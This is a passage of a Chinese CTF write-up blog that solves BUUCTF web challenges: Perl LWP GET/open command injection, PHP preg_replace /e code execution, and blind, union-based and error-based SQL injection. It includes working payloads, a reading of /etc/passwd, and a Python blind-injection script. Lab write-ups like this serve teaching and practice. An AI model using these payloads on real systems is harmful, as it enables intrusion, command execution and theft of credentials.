class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>绕正则的config.php，用不可见字符绕过。</p><p>payload</p><pre><code>/index.php/config.php/%80?source</code></pre><h1 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h1><p><strong>考点：perl中 GET open漏洞</strong></p><p>进来给了源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$http_x_headers</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$http_x_headers</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">"sandbox/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"orange"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string">"GET "</span> <span class="token punctuation">.</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dir</span>  <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">"dirname"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">"basename"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>代码的大概逻辑是：通过ip为用户创建个人文件夹；执行通过$url传参进来的内容，并将执行结果写入用户命名的文件中（$filename）。</p><p>回显给了ip</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216102256108.png" srcset="/img/loading.gif" alt="image-20201216102256108"></p><p>先确定文件夹路径是这个。</p><pre><code>sandbox/d1bcce949acb60e760fd148cea0a9ed5</code></pre><p>读取根目录，创建文件111。</p><pre><code>?url=/&amp;filename=111</code></pre><p>访问sandbox/d1bcce949acb60e760fd148cea0a9ed5/111</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216104527708.png" srcset="/img/loading.gif" alt="image-20201216104527708"></p><p>一开始想直接读，但读不到。</p><p>按题意应该是要借readflag去读。</p><p>那么执行readflag文件。</p><p>根据file协议的代码可知，要想进行到open函数，得文件名存在才行，所以要先建立一个命令的同名文件。</p><p>再去执行命令才能成功。</p><p>payload</p><pre><code>/?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code></pre><pre><code>/?url=file:bash -c /readflag|&amp;filename=123</code></pre><p>读到flag。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216111153734.png" srcset="/img/loading.gif" alt="image-20201216111153734"></p><h2 id="perl中-GET-open漏洞原理"><a href="#perl中-GET-open漏洞原理" class="headerlink" title="perl中 GET open漏洞原理"></a>perl中 GET open漏洞原理</h2><p>GET是Lib for WWW in Perl中的命令，目的是模拟http的GET请求。</p><p>GET后接路径，本身就可以获取文件或目录内容。</p><pre><code>GET /</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216101920820.png" srcset="/img/loading.gif" alt="image-20201216101920820"></p><pre><code>GET /etc/passwd</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216102014329.png" srcset="/img/loading.gif" alt="image-20201216102014329"></p><p>perl中处理file协议的perl5/LWP/Protocol/file.pm如下,可以看到引用了open函数：</p><pre class=" language-perl"><code class="language-perl"><span class="token comment" spellcheck="true">#第47行</span>    <span class="token comment" spellcheck="true"># test file exists and is readable</span>    <span class="token keyword">unless</span> <span class="token punctuation">(</span><span class="token operator">-e</span> <span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    return HTTP<span class="token punctuation">:</span><span class="token punctuation">:</span>Response<span class="token operator">-></span>new<span class="token punctuation">(</span> <span class="token variable">&amp;HTTP::Status::RC_NOT_FOUND</span><span class="token punctuation">,</span>                  <span class="token string">"File `$path' does not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">unless</span> <span class="token punctuation">(</span><span class="token operator">-r</span> <span class="token filehandle symbol">_</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    return HTTP<span class="token punctuation">:</span><span class="token punctuation">:</span>Response<span class="token operator">-></span>new<span class="token punctuation">(</span> <span class="token variable">&amp;HTTP::Status::RC_FORBIDDEN</span><span class="token punctuation">,</span>                  <span class="token string">'User does not have read permission'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token operator">...</span><span class="token comment" spellcheck="true">#第127行</span>    <span class="token comment" spellcheck="true"># read the file</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$method</span> <span class="token operator">ne</span> <span class="token string">"HEAD"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    open<span class="token punctuation">(</span>F<span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token operator">or</span> return new  <span class="token comment" spellcheck="true">#&lt;---这里</span>        HTTP<span class="token punctuation">:</span><span class="token punctuation">:</span>Response<span class="token punctuation">(</span><span class="token variable">&amp;HTTP::Status::RC_INTERNAL_SERVER_ERROR</span><span class="token punctuation">,</span>               <span class="token string">"Cannot read file '$path': $!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    binmode<span class="token punctuation">(</span>F<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$response</span> <span class="token operator">=</span>  <span class="token variable">$self</span><span class="token operator">-></span>collect<span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">,</span> <span class="token variable">$response</span><span class="token punctuation">,</span> <span class="token keyword">sub</span> <span class="token punctuation">{</span>        <span class="token keyword">my</span> <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">my</span> <span class="token variable">$bytes</span> <span class="token operator">=</span> sysread<span class="token punctuation">(</span>F<span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        return <span class="token operator">\</span><span class="token variable">$content</span> <span class="token keyword">if</span> <span class="token variable">$bytes</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span>        return <span class="token operator">\</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    close<span class="token punctuation">(</span>F<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token operator">...</span></code></pre><p>而open函数存在命令执行漏洞。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216095710379.png" srcset="/img/loading.gif" alt="image-20201216095710379"></p><p>因此，当GET使用file协议时，会间接调用到open函数，导致命令执行。</p><pre><code>GET file:|ls</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216100656852.png" srcset="/img/loading.gif" alt="image-20201216100656852"></p><h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><p>考点：php伪协议、preg_replace代码执行</p><p>源码：</p><pre><code>&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;)){  echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;  if(preg_match(&quot;/flag/&quot;,$file)){    die(&quot;Not now!&quot;);  }  include($file); //next.php}else{  highlight_file(__FILE__);}?&gt;</code></pre><p>伪协议先读取next.php。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216115625307.png" srcset="/img/loading.gif" alt="image-20201216115625307"></p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//next.php</span><span class="token delimiter">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string">'/('</span> <span class="token punctuation">.</span> <span class="token variable">$re</span> <span class="token punctuation">.</span> <span class="token string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        <span class="token variable">$str</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可以看到preg_replace是在/e模式下的，这种情况存在命令执行漏洞。</p><p>可以构造Payload</p><pre><code>?.*={${phpinfo()}}</code></pre><p>但有个问题，PHP中会将$_GET数组参数名中的非法字符转换为下划线。这样我们构造的payload就失效了。</p><p>先fuzz下哪些字符非法。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216142532392.png" srcset="/img/loading.gif" alt="image-20201216142532392"></p><p>当符号为首字母时，只有.被判定为非法字符。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216143818256.png" srcset="/img/loading.gif" alt="image-20201216143818256"></p><p>构造一个GET下可用的paylad</p><pre><code>?\S*=${phpinfo()}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216144417591.png" srcset="/img/loading.gif" alt="image-20201216144417591"></p><p>找flag</p><pre><code>?\S*=${getflag()}&amp;cmd=system(&quot;ls%20/&quot;);</code></pre><p>cat flag</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216144920040.png" srcset="/img/loading.gif" alt="image-20201216144920040"></p><h1 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h1><p><strong>考点：无列名注入、bypass information</strong></p><p>bypass**下1,2回显不同</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216145728239.png" srcset="/img/loading.gif" alt="image-20201216145728239"></p><p>输入1 or 回显SQL Injection Checked.</p><p>试一下发现有过滤</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216145814722.png" srcset="/img/loading.gif" alt="image-20201216145814722"></p><p>fuzz一下</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216145746660.png" srcset="/img/loading.gif" alt="image-20201216145746660"></p><p>其中的information被过滤意味着我们常规的查表语句无法使用，需要有其他数据库来代替：</p><p>MySQL5.7的新增了sys schemma，基础数据来自于performance_schema和information_schema两个库，本身数据库不存储数据。（需要root权限）</p><p><strong>sys.schema_auto_increment_columns</strong></p><p><strong>schema_table_statistics_with_buffer</strong></p><p><strong>x$schema_table_statistics_with_buffer</strong></p><p><strong>sys.x$schema_flattened_keys</strong></p><p>…</p><p>诸如此类还有很多能应用的库。</p><p>参考：<a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a></p><p>可是这个库不包含列名，所以又涉及到无列名注入的知识点。</p><p>但无列名注入通常由union来实现，而这里的union也被过滤了。</p><p>如果表中仅有一列：substr((select * from table),1,1)=‘x’即可实现目的。</p><p>但本题中不止一列，需要将查询语句与相同数量的列进行比较，进行盲注 。</p><p>例如：</p><pre><code>执行select (select &#39;1&#39;,&#39;e~&#39;)&gt;(select * from table2 limit 1)显示0执行select (select &#39;1&#39;,&#39;f~&#39;)&gt;(select * from table2 limit 1)显示1执行select (select &#39;1&#39;,&#39;fl~&#39;)&gt;(select * from table2 limit 1)显示1</code></pre><p>但问题在于，mysql默认不区分大小写，因此这种形式只有在flag仅为大/小写时适用。（比如本题）</p><p>而区分大小写需要使用 <strong>SELECT CONCAT(“A”, CAST(0 AS JSON))</strong> 来另其返回二进制字符串。</p><p>综上，脚本如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"http://55e66a5c-d66a-4320-bf74-210dd4750bd7.node3.buuoj.cn/index.php"</span><span class="token keyword">def</span> <span class="token function">exp1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    str1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'0123456789'</span><span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>punctuation<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    select <span class="token operator">=</span> <span class="token string">'select group_concat(table_name) from sys.x$schema_flattened_keys'</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> str1<span class="token punctuation">:</span>            paylaod <span class="token operator">=</span> <span class="token string">"1 &amp;&amp; (select substr(({}),{},1))='{}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>select<span class="token punctuation">,</span> j<span class="token punctuation">,</span> i<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(paylaod)</span>            data <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token string">'id'</span><span class="token punctuation">:</span> paylaod<span class="token punctuation">,</span>            <span class="token punctuation">}</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                flag <span class="token operator">+=</span> i                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">exp2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#区分大小写(应该是环境有问题 跑不出)</span>    str1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'-0123456789'</span><span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_uppercase<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span>string<span class="token punctuation">.</span>punctuation<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    flag_table_name <span class="token operator">=</span> <span class="token string">'f1ag_1s_h3r3_hhhhh'</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> str1<span class="token punctuation">:</span>            i <span class="token operator">=</span> flag<span class="token operator">+</span>i            paylaod <span class="token operator">=</span> <span class="token string">"1&amp;&amp;((select 1,concat('{}~',CAST('0' as json))) &lt; (select * from {}))"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>flag_table_name<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(paylaod)</span>            data <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token string">'id'</span><span class="token punctuation">:</span> paylaod<span class="token punctuation">,</span>            <span class="token punctuation">}</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token operator">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                flag<span class="token operator">=</span>i                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">exp3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#不区分大小写</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            a<span class="token operator">=</span>chr<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token punctuation">)</span>            payload <span class="token operator">=</span> <span class="token string">"1&amp;&amp;((select 1,0x%s7e)>(select * from f1ag_1s_h3r3_hhhhh))"</span><span class="token operator">%</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>a<span class="token punctuation">)</span>            data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span>            req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">in</span> req<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>                flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>n<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    exp1<span class="token punctuation">(</span><span class="token punctuation">)</span>    exp2<span class="token punctuation">(</span><span class="token punctuation">)</span>    exp3<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>参考：<a href="https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/" target="_blank" rel="noopener">https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/</a></p><p><a href="https://blog.csdn.net/a3320315/article/details/104476566" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104476566</a></p><p><a href="https://blog.csdn.net/qq_42967398/article/details/104472352?fps=1&amp;locationNum=2" target="_blank" rel="noopener">https://blog.csdn.net/qq_42967398/article/details/104472352?fps=1&amp;locationNum=2</a></p><h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><p>考点：无列名注入</p><p>和上一道题有点像。但由于环境问题，需要用另一种姿势来做。</p><p>一开始的登录注册纯粹是迷惑人的。</p><p>进来是一个留言板，有二次注入。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216151316834.png" srcset="/img/loading.gif" alt="image-20201216151316834"></p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216151306282.png" srcset="/img/loading.gif" alt="image-20201216151306282"></p><p>想测下字段，发现有过滤。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216151539036.png" srcset="/img/loading.gif" alt="image-20201216151539036"></p><p>该说不说，这题属实麻烦，想fuzz一下结果还限制上传条数。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216152839612.png" srcset="/img/loading.gif" alt="image-20201216152839612"></p><p>测了好半天。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216154202895.png" srcset="/img/loading.gif" alt="image-20201216154202895"></p><p>order被过滤，用 group测字段，测得字段数为22（…）。</p><p>常规payload,buu这环境没这库…</p><pre><code>-1&#39;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns/**/where/**/table_schema=schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216155148981.png" srcset="/img/loading.gif" alt="image-20201216155148981"></p><p>找wp去了..据说是这个环境确实有点问题，基本wp都是基于已知users表的前提下写的。这个用的是子查询。</p><p>payload</p><pre><code>-1&#39;/**/union/**/select/**/1, (select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216155714338.png" srcset="/img/loading.gif" alt="image-20201216155714338"></p><pre><code>-1&#39;/**/union/**/select/**/1, (select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201216155805859.png" srcset="/img/loading.gif" alt="image-20201216155805859"></p><p>正常情况还是用sys.schema_auto_increment_columns库的。</p><p>记录一下原题payload。</p><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#group by获取列数</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/group/**/by/**/22,'</span><span class="token number">11</span> <span class="token shell-comment comment">#查看版本</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span> <span class="token shell-comment comment">#获取表名</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1, (select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_colum ns/**/where/**/table_schema=schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 ,19,20,21,'</span><span class="token number">22</span> <span class="token shell-comment comment">#获取用户名</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1, (select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span> <span class="token shell-comment comment">#获取密码</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1, (select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span></code></pre><p>报错注入</p><pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token string">'/**/||/**/ST_LatFromGeoHash(concat(0x7e,(select/**/database()),0x7e))/**/||'</span>a<span class="token string">'='</span>a<span class="token number">1</span><span class="token string">'/**/&amp;&amp;/**/ST_LatFromGeoHash(concat(0x7e,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns/**/where/**/table_schema='</span>web1<span class="token string">'),0x7e))/**/&amp;&amp;'</span>a<span class="token string">'='</span>a<span class="token number">1</span><span class="token 